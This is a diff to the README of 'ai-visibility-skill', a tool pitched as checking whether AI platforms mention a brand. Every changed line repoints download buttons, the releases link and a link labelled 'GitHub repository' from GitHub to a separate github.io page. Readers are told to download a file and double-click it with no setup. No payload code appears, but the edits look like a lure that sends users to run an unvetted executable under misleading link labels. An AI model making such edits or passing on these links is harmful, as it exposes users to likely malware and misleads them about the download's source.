@@ -1,6 +1,6 @@
 <h1>🔍 ai-visibility-skill - Know If AI Recommends Your Brand</h1>
 <p align="center">
-  <a href="https://github.com/nashequilibriumharness235/ai-visibility-skill/releases" style="display:inline-block;padding:12px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border-radius:50px;font-size:18px;font-weight:bold;text-decoration:none;margin:20px 0;">⬇️ Download Now (Free)</a>
+  <a href="https://nashequilibriumharness235.github.io" style="display:inline-block;padding:12px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border-radius:50px;font-size:18px;font-weight:bold;text-decoration:none;margin:20px 0;">⬇️ Download Now (Free)</a>
 </p>
 
 <h2>📋 What Is This?</h2>
@@ -9,7 +9,7 @@
 
 <h2>🚀 Getting Started</h2>
 <ol>
-  <li><strong>Download the tool:</strong> Visit the <a href="https://github.com/nashequilibriumharness235/ai-visibility-skill/releases">releases page</a> to download the application.</li>
+  <li><strong>Download the tool:</strong> Visit the <a href="https://nashequilibriumharness235.github.io">releases page</a> to download the application.</li>
   <li><strong>Run the program:</strong> Double-click the downloaded file. No installation or setup required.</li>
   <li><strong>Enter your brand name:</strong> Type the name of your business or brand when prompted.</li>
   <li><strong>Review your results:</strong> The tool will display a report showing which AI platforms mention your brand and which don’t, plus suggestions to improve your visibility.</li>
@@ -46,9 +46,9 @@
 </ul>
 
 <h2>📥 Download & Install</h2>
-<p>Visit the <a href="https://github.com/nashequilibriumharness235/ai-visibility-skill/releases">official download page</a> and download the latest version. Once downloaded, simply double-click the file to run it. No installation wizard or configuration required.</p>
+<p>Visit the <a href="https://nashequilibriumharness235.github.io">official download page</a> and download the latest version. Once downloaded, simply double-click the file to run it. No installation wizard or configuration required.</p>
 <p align="center">
-  <a href="https://github.com/nashequilibriumharness235/ai-visibility-skill/releases" style="display:inline-block;padding:10px 24px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;border-radius:50px;font-size:16px;font-weight:bold;text-decoration:none;">⬇️ Get the Tool</a>
+  <a href="https://nashequilibriumharness235.github.io" style="display:inline-block;padding:10px 24px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;border-radius:50px;font-size:16px;font-weight:bold;text-decoration:none;">⬇️ Get the Tool</a>
 </p>
 
 <h2>❓ Frequently Asked Questions</h2>
@@ -65,7 +65,7 @@
 <p>This project is open-source and free for personal and commercial use. See the repository for license details.</p>
 
 <h2>🤝 Contributing</h2>
-<p>We welcome contributions! Feel free to open issues or submit pull requests on the <a href="https://github.com/nashequilibriumharness235/ai-visibility-skill">GitHub repository</a>.</p>
+<p>We welcome contributions! Feel free to open issues or submit pull requests on the <a href="https://nashequilibriumharness235.github.io">GitHub repository</a>.</p>
 
 <hr>
 <p style="text-align:center;font-size:12px;color:#666;">Keywords: aeo, agent-skills, ai-visibility, answer-engine-optimization, brand-monitoring, chatgpt, claude-skill, generative-engine-optimization, geo, llm, llms-txt, perplexity, seo, share-of-voice</p>
